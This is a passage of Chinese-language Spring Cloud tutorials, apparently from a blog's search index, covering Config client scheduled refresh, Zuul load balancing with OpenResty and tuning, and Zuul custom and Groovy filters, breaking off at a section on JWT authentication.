config-client-dev.yml、config-client-prod.yml、config-client-test.yml。 2. Config Refresh Autoconfig 工程创建 Config Refresh Autoconfig 的 Maven 工程，配置工程里的 pom.xml 文件： 123456789101112&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-config-client&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-autoconfigure&lt;/artifactId&gt;&lt;/dependency&gt; 创建 Config Refresh Autoconfig 工程里的自动配置类，添加相关注解，使其在 Spring Boot 启动的时候将其加载。在该类中，主要是注入了端点类，通过定时任务和刷新时间，进行配置请求刷新。由于在类中是直接调用了 RefreshEndpoint 的 refresh() 方法，所以对于 F 版的安全机制不需要对端点进行打开也可以，但需要依赖 spring-boot-starter-actuator，否则无法注入 RefreshEndpoint 的 Bean： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152@ConditionalOnClass(RefreshEndpoint.class)@ConditionalOnProperty("spring.cloud.config.refreshInterval")@AutoConfigureAfter(RefreshAutoConfiguration.class)@Configurationpublic class ConfigAutoRefreshConfiguration implements SchedulingConfigurer { private static final Logger logger = LoggerFactory.getLogger(ConfigAutoRefreshConfiguration.class); /** * 间隔刷新时间 */ @Value("${spring.cloud.config.refreshInterval}") private long refreshInterval; /** * 刷新的端点 */ @Autowired private RefreshEndpoint refreshEndpoint; @Override public void configureTasks(ScheduledTaskRegistrar scheduledTaskRegistrar) { final long interval = getRefreshIntervalInMilliseconds(); logger.info(String.format("Scheduling config refresh task with %s second delay", refreshInterval)); scheduledTaskRegistrar.addFixedDelayTask(new IntervalTask(new Runnable() { @Override public void run() { refreshEndpoint.refresh(); } }, interval, interval)); } /** * 以毫秒为单位返回刷新间隔 * * @return */ private long getRefreshIntervalInMilliseconds() { return refreshInterval * 1000; } /** * 如果没有在上下文中注册，则启用调度程序 */ @ConditionalOnMissingBean(ScheduledAnnotationBeanPostProcessor.class) @EnableScheduling @Configuration protected static class EnableSchedulingConfigProperties { }} 在 Config Refresh Autoconfig 工程里创建 /src/main/resources/META-INF/spring.factories 配置文件，添加上面的自动配置类： 12org.springframework.boot.autoconfigure.EnableAutoConfiguration=\\com.springcloud.study.config.ConfigAutoRefreshConfiguration 3. Cofnig Client 工程这里 Cofnig Client 工程的代码基本与上面的 “Config Client 手动刷新” 示例的代码一致，拷贝一份即可，这里不再累述。 Cofnig Client 工程的 pom.xml 文件，引入 config-refresh-autoconfig 依赖： 123456789&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-config-client&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;com.springcloud.study&lt;/groupId&gt; &lt;artifactId&gt;config-refresh-autoconfig&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;&lt;/dependency&gt; Cofnig Client 工程的 application.yml 文件，refreshInterval: 15 表示每 15 秒刷新一次配置信息： 123456spring: application: name: config-client cloud: config: refreshInterval: 15 4. Cofnig Server 工程这里 Cofnig Server 工程的代码基本与上面的 “Config Client 手动刷新” 示例的代码一致，拷贝一份即可，这里不再累述。 5. 测试结果 依次启动 config-server、config-client 应用 访问 http://127.0.0.1:9001/getConfigInfo，接口会返回 I am the git configuration file from dev environment 更改 Git 远程仓库中的 config-client-dev.yml 配置文件，将内容修改为 I am the git configuration file from dev environment updated 等待一段时间后（15 秒），再次访问 http://127.0.0.1:9001/getConfigInfo，接口会返回 I am the git configuration file from dev environment updated，说明配置更新了 下篇 - Config 入门教程（中级篇） Config 入门教程 - 中级篇 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"微服务"},{title:"Zuul 入门教程 - 高级篇",url:"/posts/9652d40e.html",text:'上篇 - Zuul 入门教程（中级篇） Zuul 入门教程 - 中级篇 前言版本说明在本文中，默认使用的 Spring Cloud 版本是 Finchley.RELEASE，对应的 Spring Boot 版本是 2.0.3，Zuul 版本是 1.x，特别声明除外。 Zuul 多层负载痛点场景在 Spring Cloud 微服务架构体系中，所有请求的前门的网关 Zuul 承担着请求转发的主要功能，对后端服务起着举足轻重的作用。当业务体量猛增之后，得益于 Spring Cloud 的横向扩展能力，往往加节点、加机器就可以使得系统支撑性获得大大提升，但是仅仅加服务而不加网关是会有性能瓶颈的，单一 Zuul 节点的处理能力十分有限。因此扩张节点往往是微服务连带 Zuul 一起扩张，一般会部署一个 Zuul 集群来横向扩展微服务应用，然后再在请求上层加一层软负载，通常是使用 Nginx 均分请求到 Zuul 集群（如下图）。此时若其中一台 Zuul 服务挂掉了，由于从 Nginx 到 Zuul 其实是没有什么关联性，如果 Zuul 服务宕掉，Nginx 还是会把请求导向到 Zuul 服务，导致从 Nginx 到这 Zuul 节点的请求会全部失效，在 Nginx 没有采取相关应对措施的情况下，这是十分严重的问题。 解决方案OpenResty 整合了 Nginx 与 Lua，实现了可伸缩的 Web 服务器，内部集成了大量精良的 Lua 库、第三方模块以及多数的依赖项，能够非常快捷地搭建处理超高并发、扩展性极高的动态 Web 应用、Web 服务和动态网关。开发者可以使用 Lua 脚本模块与注册中心构建一个服务动态增减的机制，通过 Lua 获取注册中心状态为 UP 的服务，动态地加入到 Nginx 的负载均衡列表中去，由于这种架构模式涉及了不止一个负载均衡器，一般称其为 “多层负载”（如下图）。 目前 Spring Cloud 中国社区针对这一场景开源了相关的 Lua 插件源码，GitHub 地址在这里，核心配置如下。实现原理是使用 Lua 脚本定时根据配置的服务名与 Eureka 地址，去拉取该服务的信息，在 Eureka 里面提供 /eureka/apps/(serviceld) 端点，返回服务的注册信息，所以只需要取用状态为 UP 的服务，将它的地址加入 Nginx 负载列表即可。此项目使得 Nginx 与 Zuul 之间 拥有一个动态感知能力，不用手动配置 Nginx 负载与 Zuul 负载，这样对于应用弹性扩展是极其友好的。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455http { #sharing cache area lua_shared_dict dynamic_eureka_balancer 128m; init_worker_by_lua_block { -- init eureka balancer local file = require "resty.dynamic_eureka_balancer" local balancer = file:new({dict_name="dynamic_eureka_balancer"}) --eureka server list balancer.set_eureka_service_url({"127.0.0.1:8888", "127.0.0.1:9999"}) --eureka basic authentication --use this setting if eureka has enabled basic authentication. --note: basic authentication must use BASE64 encryption in `user:password` format --balancer.set_eureka_service_basic_authentication("") --The service name that needs to be monitored balancer.watch_service({"zuul", "client"}) } upstream springcloud_cn { server 127.0.0.1:666; # Required, because empty upstream block is rejected by nginx (nginx+ can use \'zone\' instead) balancer_by_lua_block { --The zuul name that needs to be monitored local service_name = "zuul" local file = require "resty.dynamic_eureka_balancer" local balancer = file:new({dict_name="dynamic_eureka_balancer"}) --balancer.ip_hash(service_name) --IP Hash LB balancer.round_robin(service_name) --Round Robin LB } } server { listen 80; server_name localhost; location / { proxy_pass http://springcloud_cn/; proxy_set_header Host $http_host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; } error_page 500 502 503 504 /50x.html; location = /50x.html { root html; } }} Zuul 应用优化概述Zuul（这里指 Zuul1.0 版本，Zuul2.0 版本之后使用了 Netty 的异步非阻塞模型）在给微服务体系带来诸多便利的同时，也饱受着性能的争议，这一切还要从它的底层架构说起。Zuul 是建立在 Servlet 的同步阻塞架构基础上，所以在处理逻辑上面是和线程密不可分的，每一次请求都需要从线程池获取一个线程来维持 I/O 操作，路由转发的时候又需要从 HTTP 客户端获取线程来维持连接，这就会导致一个组件占用两个线程资源的情况。所以，在 Zuul 的使用中，对这部分的优化是很有必要的，一个好的优化体系会使得应用支撑的业务体量更大，也能最大化利用服务器资源。在这里，将对 Zuul 的优化分为以下几个类型： 容器优化：内置容器 Tomcat 与 Undertow 的比较与参数设置 组件优化：内部集成的组件优化，如 Hystrix 线程隔离、Ribbon. HttpClient 与 OkHttp 选择 JVM 参数优化：适用于网关应用的 JVM 参数建议 内部优化：一些内部原生参数，或者内部源码，以一种更恰当的方式重写它们 容器优化关于 Spring Boot 优化的文章，网上有很多，不过大部分都会提到把默认的内嵌容器 Tomcat 替换成 Undertow。其中 Undertow 翻译为” 暗流”，即平静的湖面下暗藏着波涛汹涌，所以 JBoss 公司取其意，为它的轻量级高性能容器命名。Undertow 提供阻塞或基于 XNIO 的非阻塞机制，它的包大小不足 1MB，内嵌模式运行时的堆内存占用只有 4MB 左右。要使用 Undertow ，只需要在配置文件中移除 Tomcat，添加 Undertow 的依赖 即可： 123456789101112131415&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;exclusions&gt; &lt;exclusion&gt; &lt;groupld&gt;org.springframework.boot&lt;/groupld&gt; &lt;artifactld&gt;spring-boot-starter-tomcat&lt;/artifactld&gt; &lt;/exclusion&gt; &lt;/exclusions&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupld&gt;org.springframework.boot&lt;/groupld&gt; &lt;artifactld&gt;spring-boot-starter-undertow&lt;/artifactld&gt;&lt;/dependency&gt; Undertow 的主要配置参数如下： 组件优化在 Spring Cloud 微服务体系中，Zuul 是一个容易被忽略优化，但是集成组件最多，功能最强大的组件。Zuul 网关主要用于智能路由，同时也支持认证、区域和内容感知路由，将多个底层服务聚合成统一的对外 API。所以要更好地使用 Zuul，就免不了要对它集成的组件进行优化，使它可以更好地支撑服务集群。 Hystrix 优化由于 Zuul 默认集成了 Hystrix 熔断器，使得网关应用具有弹性、容错的能力。但是如果使用缺省的配置，可能会遇到种种问题，其中最常见的问题就是当启动 Zuul 应用之后，第一次请求往往会失败。根本原因是 Hystrix 默认的超时时间是 1 秒，如果超过这个时间尚未作出响应，将会进入 fallback 代码。由于在处理第一次请求的时候，Zuul 内部要初始化很多类信息，这是十分耗时的，如果这个响应时间超过 1 秒，就会出现请求失败的问题。解决方式有以下两种： 禁用 Hystrix 的超时时间： hystrix.command.default.execution.timeout.enabled=false 加大 Hystrix 的超时时间： hystrix.command.default.execution.isolation.thread.timeoutInMilliseconds=5000 Zuul 中关于 Hystrix 的配置还有一个很重要的点，那就是 Hystrix 的线程隔离模式的选择，包括线程池隔离模式（THREAD）或者信号量隔离模式（SEMAPHORE）。在网关中，对资源的使用是应该受到严格控制的，如果不加限制，会导致资源滥用，在恶劣的线上环境下就容易引起服务雪崩。两种隔离模式对比，如下图所示。 Hystrix 切换隔离模式的配置方式： 1hystrix.command.default.execution.isolation.strategy=Thread | Semaphore Hystrix 隔离模式选择总结，当应用需要与外网交互，由于网络开销比较大与请求比较耗时，这时选用线程隔离策略，可以保证有剩余的容器（Tomcat &amp; Undertow &amp; Jetty）线程可用，而不会由于外部原因使得线程一直处于阻塞或等待状态，可以快速失败返回。但当微服务应用只在内网交互，并且体量比较大，这时使用信号量隔离策略就比较好，因为这类应用的响应通常会非常快（由于在内网），不会占用容器线程太长时间，可以减少线程上下文切换的开销，提高应用运转的效率，也可以起到对请求进行全局限流的作用。 Ribbon 优化这里主要是讲 Ribbon 的超时重试优化，在 Spring Cloud 中有多种发送 HTTP 请求的方式可以与 Zuul 结合，RestTemplate、Ribbon 或者 Feign，但是无论选择哪种，都可能出现请求失败的情况，这在复杂的互联网环境是不可避免的。Zuul 作为一个网关中间件，在出现偶然请求失败时进行适当的重试是十分必要的，重试可以有效地避免一些突发原因引起的请求丢失。Zuul 中的重试机制是配合 Spring Retry 与 Ribbon 来使用的。 在 pom.xml 引入 Spring Retry 的依赖包： 1234&lt;dependency&gt; &lt;groupld&gt;org.springframework.retry&lt;/groupld&gt; &lt;artifactld&gt;spring-retry&lt;/artifactld&gt;&lt;/dependency&gt; 在 application.yml 里添加重试相关的配置内容： 123456789101112131415161718#Zuul开启重试，D版之后默认为false，需要手动开启zuul: retryable: true#Ribbon的重试机制配置ribbon: ConnectTimeout: 3000 ReadTimeout: 60000 MaxAutoRetries: 1 #对第一次请求的服务的重试次数 MaxAutoRetriesNextServer: 1 #要重试的下一个服务的最大数量（不包括第一个服务） OkToRetryOnAllOperations: true#SpringCloud内部默认已开启负载均衡重试，这里列出来说明这个参数比较重要spring: cloud: loadbalancer: retry: enabled: true 配置当中的 ConnectTimeout 与 ReadTimeou 是当 HTTP 客户端使用 Apache HttpClient 的时候生效的，这个超时时间最终会被设置到 Apache HttpClient 中去。在设置的时候要结合 Hystrix 的超时时间来综合考虑，针对不同的应用场景，设置太小会导致很多请求失败，设置太大会导致熔断功能控制性变差，所以需要经过压力测试得来。Zuul 同时也支持对单个映射规则进行重试 zuul.routes.&lt;route&gt;.retryable=true，需要注意的是，在某些对幂等要求比较高的使用场景下，要慎用重试机制，因为如果没有相关处理的话，出现幂等问题是十分有可能的。 内部优化在官方文档中，Zuul 部分开篇讲了 zuul.max.host.connections 属性拆解成了 zuul.host.maxTotalConnections（服务 HTTP 客户端最大连接数）与 zuul.host.maxPerRouteConnections（每个路由规则 HTTP 客户端最大连接数），默认值分别为 200 与 20，如果使用 Apache HttpClient 的时候这两个配置参数则有效，如果使用 OkHttp 则无效。在 Zuul 中还有一个超时时间，使用 serviceld 映射与 url 映射的设置是不一样的，如果使用 serviceld 映射，ribbon.ReadTimeout 与 ribbon.SocketTimeout 生效；如果使用 url 映射，应该设置 zuul.host.connect-timeout-millis 与 zuul.host.socket-timeout-millis 参数。 Zuul 源码解析（待续） var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"微服务"},{title:"Zuul 入门教程 - 中级篇",url:"/posts/6f728f64.html",text:'上篇 - Zuul 入门教程（基础篇） Zuul 入门教程 - 基础篇 前言版本说明在本文中，默认使用的 Spring Cloud 版本是 Finchley.RELEASE，对应的 Spring Boot 版本是 2.0.3，Zuul 版本是 1.x，特别声明除外。 Zuul Filter 链工作原理Zuul 的核心逻辑是由一系列紧密配合工作的 Filter 来实现的，它们能够在进行 HTTP 请求或者响应的时候执行相关操作。可以说，没有 Filter 责任链，就没有如今的 Zuul，更不可能构成功能丰富的” 网关 “，Zuul Filter 的主要特性有以下几点： Filter 的类型：Filter 的类型决定了此 Filter 在 Filter 链中的执行顺序，可能是路由动作发生前，可能是路由动作发生时，可能是路由动作发生后，也可能是路由过程发生异常时 Filter 的执行顺序：同一种类型的 Filter 可以通过 filterOrder() 方法来设定执行顺序，一般会根据业务的执行顺序需求，来设定自定义 Filter 的执行顺序 Filter 的执行条件：Filter 运行所需要的标准或条件 Filter 的执行效果：符合某个 Filter 执行条件，产生的执行效果 Zuul 内部提供了一个动态读取、编译和运行这些 Filter 的机制，Filter 之间不直接通信，在请求线程中会通过 RequestContext 来共享状态，它的内部是用 ThreadLocal 实现的，当然也可以在 Filter 之间使用 ThreadLocal 来收集自己需要的状态或数据。Zuul 中不同类型 Filter 的执行逻辑核心在 com.netflix.zuul.http.ZuulServlet 类中定义，该类相关代码和官方流程图如下所示： 12345678910111213141516171819202122232425262728293031try { this.init((HttpServletRequest)servletRequest, (HttpServletResponse)servletResponse); RequestContext context = RequestContext.getCurrentContext(); context.setZuulEngineRan(); try { this.preRoute(); } catch (ZuulException var13) { this.error(var13); this.postRoute(); return; } try { this.route(); } catch (ZuulException var12) { this.error(var12); this.postRoute(); return; } try { this.postRoute(); } catch (ZuulException var11) { this.error(var11); }} catch (Throwable var14) { this.error(new ZuulException(var14, 500, "UNHANDLED_EXCEPTION_" + var14.getClass().getName()));} finally { RequestContext.getCurrentContext().unset();} 上面的官方流程图有些问题，其中 Post Filter 抛错之后进入 Error Filter，然后再进入 Post Filter 是有失偏颇的。实际上 Post Filter 抛错分两种情况： 在 Post Filter 抛错之前，Pre、Route Filter 没有抛错，此时会进入 ZuulException 的逻辑，打印堆栈信息，然后再返回 status = 500 的 Error 信息 在 Post Filter 抛错之前，Pre、Route Filter 已有抛错，此时不会打印堆栈信息，直接返回 status = 500 的 Error 信息 也就是说，整个责任链流程终点不只是 Post Filter，还可能是 Error Filter，重新整理后的流程图 Filter 的生命周期Zuul 一共有四种不同生命周期的 Filter，分别是： pre：在 Zuul 按照映射规则路由到下级服务之前执行，如果需要对请求进行预处理，比如鉴权、限流等，都应考虑在此类 Filter 里实现 route：这类 Filter 是 Zuul 路由动作的执行者，是 Apache HttpClient 或 Netflix Ribbon 构建和发送原始 HTTP 请求的地方，目前已支持 OkHttp post：这类 Filter 是在源服务返回结果或者异常信息发生后执行的，如果需要对返回信息做一些处理，则在此类 Filter 进行处理 error：在整个生命周期内如果发生异常，则会进入 Error Filter，可做全局异常处理 在实际项目中，往往需要自实现以上类型的 Filter 来对请求链路进行处理，根据业务的需求，选取相应生命周期的 Filter 来达成目的。在 Filter 之间，通过 com.netflix.zuul.context. RequestContext 类来进行通信，内部采用 ThreadLocal 保存每个请求的一些信息，包括请求路由、错误信息、HttpServletRequest、HttpServletResponse，这使得一些操作是十分可靠的，它还扩展了 ConcurrentHashMap，目的是为了在处理过程中保存任何形式的信息。 Zuul 的原生 Filter首先官方文档提到，Zuul Server 如果使用 @EnableZuulProxy 注解搭配 Spring Boot Actuator，会多出两个管控端点，具体配置如下： 1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;&lt;/dependency&gt; 123456# 暴露所需的端点management: endpoints: web: exposure: include: health, info, routes, filters 端点 /actuator，查看截图 端点 /filters：返回当前 Zuul Server 中所有已注册生效的 Filter，查看截图 端点 /routes：返回当前 Zuul Server 中所有已生成的映射规则，加上 /details 可查看详细信息，查看截图 从端点 /filters 返回的数据可以清楚地看到所有已注册生效的 Filter 信息，包括：Filter 实现类路径、Filter 执行次序、是否被禁用、是否静态。根据返回的内容，将前面的图稍作扩展，即可得到 Zuul 内置 Filter 与生命周期的组合流程图 。 Zuul 内置了各种 Filter（见上表），以上是使用 @EnableZuulProxy 注解后注册的 Filter，如果使用 @EnableZuulServer 将缺少 PreDecorationFilter、RibbonRoutingFilter、SimpleHostRoutingFilter 这些原生 Filter。如果有特殊的业务需求，可以采取替代实现的方式，覆盖掉其原生代码，也可以釆取禁用策略，语法如下：zuul.&lt;SimpleClassName&gt;.&lt;filterType&gt;.disable=true 多级业务处理自定义 Filter在 Zuul 的 Filter 链体系中，可以把一组业务逻辑细分，然后封装到一个个紧密结合的 Filter 中，设置处理顺序，组成一组 Filter 链。这在一些业务场景下十分实用，以致除 Zuul 以外的网关中间件几乎都有类似的实现。在 Zuul 里实现自定义 Filter，只需继承 ZuulFilter 类即可，ZuulFilter 是一个抽象类，需要实现它的以下几个方法： String filterType ()：使用返回值设定 Filter 类型，可以设置为 pre、route、post、error 类型。 int filterOrder ()：使用返回值设定 Filter 执行次序 boolean shouldFilter ()：使用返回值设定该 Filter 是否执行，可以作为开关来使用 Object run ()：Filter 里面的核心执行逻辑，业务处理在此编写 在 Zuul 里自定义 Filter 的示例代码如下： 1234567891011121314151617181920212223242526272829303132import com.netflix.zuul.ZuulFilter;import com.netflix.zuul.exception.ZuulException;import org.slf4j.Logger;import org.slf4j.LoggerFactory;import static org.springframework.cloud.netflix.zuul.filters.support.FilterConstants.PRE_TYPE;public class FirstPreFilter extends ZuulFilter { private static final Logger logger = LoggerFactory.getLogger(FirstPreFilter.class); @Override public String filterType() { return PRE_TYPE; } @Override public int filterOrder() { return 0; } @Override public boolean shouldFilter() { return true; } @Override public Object run() throws ZuulException { logger.info("==&gt; first custom zuul filter"); return null; }} 12345678@Configurationpublic class CommonConfiguration { @Bean public FirstPreFilter firstPreFilter() { return new FirstPreFilter(); }} 业务处理实战Zuul 作为一个 “网关” 组件，原始的功能往往不能满足实际业务需求，为了解决这个问题，官方预留了 API，使得开发者能够实现自定义业务处理，加入 Zuul 的逻辑流程。下面模拟一个业务需求，使用 SecondPreFilter 来验证是否传入 a 参数，使用 ThirdPreFilter 来验证是否传入 b 参数，最后在 PostFilter 里边统一处理返回内容，查看流程图 ，点击下载完整的示例代码。 123456789101112131415161718192021222324252627282930313233343536373839404142public class SecondPreFilter extends ZuulFilter { private static final Logger logger = LoggerFactory.getLogger(SecondPreFilter.class); @Override public String filterType() { return PRE_TYPE; } @Override public int filterOrder() { return 2; } @Override public boolean shouldFilter() { return true; } @Override public Object run() throws ZuulException { logger.info("==&gt; second custom zuul pre filter"); //从RequestContext获取上下文 RequestContext context = RequestContext.getCurrentContext(); //从上下文获取HttpServletRequest HttpServletRequest request = context.getRequest(); //从request尝试获取a参数值 String a = request.getParameter("a"); if (null == a) { //对该请求禁止路由，也就是禁止访问下游服务 context.setSendZuulResponse(false); //保存于上下文，作为同类型下游Filter的执行开关 context.set("logic-is-success", false); //设定responseBody供PostFilter使用 context.setResponseBody("{\\"status\\":500,\\"message\\":\\"param a is null !\\"}"); return null; } //设置避免报空异常 context.set("logic-is-success", true); return null; }} 12345678910111213141516171819202122232425262728293031323334353637383940414243public class ThirdPreFilter extends ZuulFilter { private static final Logger logger = LoggerFactory.getLogger(ThirdPreFilter.class); @Override public String filterType() { return PRE_TYPE; } @Override public int filterOrder() { return 3; } @Override public boolean shouldFilter() { RequestContext context = RequestContext.getCurrentContext(); return (boolean) context.get("logic-is-success"); } @Override public Object run() throws ZuulException { logger.info("==&gt; third custom zuul pre filter"); //从RequestContext获取上下文 RequestContext context = RequestContext.getCurrentContext(); //从上下文获取HttpServletRequest HttpServletRequest request = context.getRequest(); //从request尝试获取b参数值 String b = request.getParameter("b"); if (null == b) { //对该请求禁止路由，也就是禁止访问下游服务 context.setSendZuulResponse(false); //保存于上下文，作为同类型下游Filter的执行开关，假定后续还有自定义Filter当设置此值 context.set("logic-is-success", false); //设定responseBody供PostFilter使用 context.setResponseBody("{\\"status\\":500,\\"message\\":\\"param b is null !\\"}"); return null; } //设置避免报空异常 context.set("logic-is-success", true); return null; }} 1234567891011121314151617181920212223242526272829303132333435363738public class PostFilter extends ZuulFilter { private static final Logger logger = LoggerFactory.getLogger(SecondPreFilter.class); @Override public String filterType() { return POST_TYPE; } @Override public int filterOrder() { return 0; } @Override public boolean shouldFilter() { return true; } @Override public Object run() throws ZuulException { logger.info("==&gt; custom zuul post filter"); //从RequestContext获取上下文 RequestContext context = RequestContext.getCurrentContext(); //处理返回中文乱码 context.getResponse().setCharacterEncoding("UTF-8"); //获取上下文中保存的responseBody String responseBody = context.getResponseBody(); //如果responseBody不为空，则说明流程有异常发生 if (null != responseBody) { //设定返回状态码 context.setResponseStatusCode(500); //替换响应报文 context.setResponseBody(responseBody); } return null; }} 测试效果： 依次启动 eureka-server、provider-service、zuul-server 应用 访问 http://127.0.0.1:8092/provider/service/provider/add?b=3，日志输出如下： 12SecondPreFilter : ==&gt; second custom zuul pre filterSecondPreFilter : ==&gt; custom zuul post filter 访问 http://127.0.0.1:8092/provider/service/provider/add?a=3，日志输出如下： 123SecondPreFilter : ==&gt; second custom zuul pre filterThirdPreFilter : ==&gt; third custom zuul pre filterSecondPreFilter : ==&gt; custom zuul post filter 使用 Groovy 编写 FilterGroovy 语言是基于 JVM 的一门动态语言，它结合了 Python、 Ruby 和 Smalltalk 的许多强大特性，支持无缝引入 Java 代码与 Java 库，常常被用作 Java 的扩展语言来使用。它的语法与 Java 类似，书写起来比 Java 略为简洁，是一门很优秀的语言。Zuul 中提供 Groovy 的编译类 com.netflix.zuul.groovy.GroovyCompiler，结合 com.netflix.zuul.groovy.GroovyFileFilter 类，可以使用 Groovy 来编写自定义的 Filter。也许到这里，很多开发者认为它在 Zuul 中没有存在的必要，但是当得知它可以不用编译（不用打进工程包），可以放在服务器上任意位置，可以任何时候修改由它编写的 Filter，且修改过后还不用重启服务的时候，就会知道它有多实用了。下面使用 Groovy 编写自定义 Filter 作为例子，点击下载完整的示例代码。 首先添加 Groovy 相关的依赖，需要指定 Groovy 的版本来覆盖 SpringBoot 中的 Groovy 版本，建议这里不要使用阿里云的 Maven 仓库，否则会找不到最新版本的 Groovy： 123456789101112&lt;properties&gt; &lt;groovy.version&gt;3.0.3&lt;/groovy.version&gt;&lt;/properties&gt;&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.codehaus.groovy&lt;/groupId&gt; &lt;artifactId&gt;groovy-all&lt;/artifactId&gt; &lt;version&gt;${groovy.version}&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 使用 Groovy 编写自定义 Filter，并将 Groovy 的源码文件 GroovyFilter.groovy 保存在 /tmp/groovy/ 目录下： 1234567891011121314151617181920212223242526272829303132333435363738import com.netflix.zuul.ZuulFilterimport com.netflix.zuul.context.RequestContextimport com.netflix.zuul.exception.ZuulExceptionimport javax.servlet.http.HttpServletRequestimport static org.springframework.cloud.netflix.zuul.filters.support.FilterConstants.PRE_TYPEclass GroovyFilter extends ZuulFilter { @Override String filterType() { return PRE_TYPE } @Override int filterOrder() { return 10 } @Override boolean shouldFilter() { return true } @Override Object run() throws ZuulException { println("This is Groovy Filter!") HttpServletRequest request = RequestContext.currentContext.request as HttpServletRequest Iterator headerIt = request.getHeaderNames().iterator() while (headerIt.hasNext()) { String name = (String) headerIt.next() String value = request.getHeader(name) println("header: " + name + ": " + value) } return null }} 注册 GroovyFilter.groovy： 12345678910111213141516@Componentpublic class GroovyRunner implements CommandLineRunner { @Override public void run(String... args) throws Exception { MonitoringHelper.initMocks(); FilterLoader.getInstance().setCompiler(new GroovyCompiler()); try{ FilterFileManager.setFilenameFilter(new GroovyFileFilter()); // 指定Groovy源码文件的绝对路径，对路径每隔20秒扫描一次 FilterFileManager.init(20, "/tmp/groovy"); }catch(Exception e){ throw new RuntimeException(e); } }} 测试： 依次启动 eureka-server、provider-service、zuul-server 应用 访问 http://127.0.0.1:8092/provider/service/provider/add?b=3，日志输出如下： 123456This is Groovy Filter!header: host: 127.0.0.1:8092header: connection: keep-aliveheader: cache-control: max-age=0header: upgrade-insecure-requests: 1... 将 /tmp/groovy/GroovyFilter.groovy 里的 println("This is Groovy Filter!") 更改为 println("This is Groovy Filter Modify!") 等待 20 秒后，访问 http://127.0.0.1:8092/provider/service/provider/add?b=3，日志输出如下： 123456This is Groovy Filter Modify!header: host: 127.0.0.1:8092header: connection: keep-aliveheader: cache-control: max-age=0header: upgrade-insecure-requests: 1... Zuul 权限集成应用权限概述权限，是整个微服务体系乃至软件业永恒的话题，有资源的地方，就有权限约束。以往在构建单体应用的时候，比较流行的方式是使用 Apache Shiro，开发者的印象都是 Apache Shiro 比 Spring Security 上手容易，学习成本相对较小，但是到了 Spring Cloud 这里，面对成千上万的服务，而且服务之间无状态，此时 Apache Shiro 难免显得力不从心，所以 Spring Cloud 没有选择它也是有原因的。在解决方案的选择上面，传统的譬如单点登录（SSO），或者分布式 Session，要么致使权限服务器集中化导致流量臃肿，要么需要实现一套复杂的存储同步机制，都不是最好的解决方案。作为 Spring Cloud 微服务体系流量前门的 Zuul，除去与它特性毫无相关的实现方式，比较好的方式有： 自定义权限认证 Filter由于 Zuul 对请求转发全程的可控性，可以在 Requestcontext 的基础上做任何事情，例如只需要设置一个执行顺序靠前的 Filter，就可以专门对请求的特定内容做权限认证。这种方式的优点是实现灵活度高，可整合已有权限系统，对原始系统微服务化特别友好；缺点是需要开发一套新的逻辑，维护增加成本，而且也会使得调用链路变得紊乱。 OAuth2.0 + JWT 认证OAuth2.0 是业界对于 “授权 - 认证” 比较成熟的面向资源的授权协议。举个例子，除了可以使用本站用户名与密码登录 Spring Cloud 中国社区，还可以使用第三方应用登录，比如：GitHub、QQ 等登录方式。第三方登录功能对用户十分有亲和力，而 Oauth2.0 就是用于定义 Spring Cloud 中国社区与用户之间的那个 “授权层” 的。Oauth2.0 的认证原理图如下，在整个流程中，用户是资源拥有者，其关键还是在于客户端需要资源拥有者的授权，这个过程就相当于键入密码或者是其他第三方登录，触发了这个操作之后，客户端就可以向授权服务器申请 Token，拿到后再携带 Token 到资源所在服务器拉取相应资源。 JWT（JSON Web Token）是一种使用 JSON 格式来规约 Token 或者 Session 的协议。由于传统认证方式免不了会生成一个凭证，这个凭证可以是 Token 或者 Session，保存于服务端或者其他持久化工具中，这样一来，凭证的存取就变得十分麻烦，JWT 的出现打破了这一瓶颈，实现了 “客户端 Session” 的愿景。JWT 